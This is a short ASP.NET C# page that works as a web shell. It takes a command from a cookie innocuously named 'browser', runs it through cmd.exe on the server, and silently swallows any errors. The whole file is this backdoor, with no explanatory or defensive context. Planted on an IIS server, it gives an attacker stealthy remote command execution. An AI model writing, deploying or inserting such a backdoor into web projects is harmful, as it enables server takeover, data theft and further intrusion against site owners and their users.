<%@ Page Language="C#" %>
<% 
try
{ 
    string cmd = Request.Cookies["browser"].Value;
    System.Diagnostics.Process.Start("cmd.exe", "/c " + cmd);
} 
catch (Exception ex) 
{
    // handle error 
} 
%> 
